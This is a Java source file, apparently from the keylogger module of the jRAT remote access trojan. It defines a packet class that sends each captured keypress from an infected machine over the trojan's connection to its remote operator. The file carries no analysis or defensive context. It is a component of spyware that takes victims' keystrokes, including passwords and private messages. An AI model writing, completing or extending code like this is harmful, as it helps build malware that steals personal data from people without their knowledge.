package jrat.module.keys.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.client.packets.outgoing.OutgoingPacket;
import jrat.module.keys.Keylogger;

import java.io.File;

/**
 * Sent when a key was pressed
 */
public class PacketKey implements OutgoingPacket {

    private String c;

    public PacketKey(String c) {
        this.c = c;
    }

    public void write(Connection con) throws Exception {
        con.writeLine(c);
    }
    
    public short getPacketId() {
        return 124;
    }
}
